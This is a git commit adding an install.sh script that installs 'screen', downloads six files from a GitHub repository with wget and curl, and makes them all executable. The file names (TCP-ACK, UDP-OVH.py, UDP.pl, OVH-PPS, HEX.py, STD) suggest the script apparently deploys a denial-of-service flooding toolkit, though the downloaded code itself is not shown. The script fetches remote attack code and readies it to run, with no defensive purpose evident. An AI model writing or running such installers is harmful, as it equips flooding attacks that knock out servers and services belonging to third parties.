30a5358056b1486d9e39bd6467bf97e15904b962
Null <66106308+nullmc@users.noreply.github.com>
2022-12-14 19:54:09 -0400

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+
+apt install screen -y
+
+wget https://github.com/nullmc/docs/raw/main/OVH-PPS
+curl https://raw.githubusercontent.com/nullmc/docs/main/HEX.py -o HEX.py
+wget https://github.com/nullmc/docs/raw/main/STD
+wget https://github.com/nullmc/docs/raw/main/TCP-ACK
+curl https://raw.githubusercontent.com/nullmc/docs/main/UDP-OVH.py -o UDP-OVH.py
+curl https://raw.githubusercontent.com/nullmc/docs/main/UDP.pl -o UDP.pl
+
+chmod +x *
